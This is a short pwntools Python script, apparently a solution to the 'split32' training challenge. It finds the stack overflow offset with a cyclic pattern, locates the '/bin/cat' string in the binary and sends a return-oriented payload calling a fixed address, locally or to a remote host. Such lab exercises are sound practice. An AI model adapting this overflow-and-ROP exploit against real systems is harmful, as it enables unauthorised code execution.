#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.pc)
    return ip_offset

exe = './split32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'error'
bincat_str = next(elf.search(b'/bin/cat'))
offset = find_offset(cyclic(100))
info(f'Offset: {offset}')

payload = flat({ offset: [0x0804861a, bincat_str] })
write('payload', payload)
info(f'Payload: {payload}')

io = start()
io.sendlineafter(b'>', payload)
io.interactive()
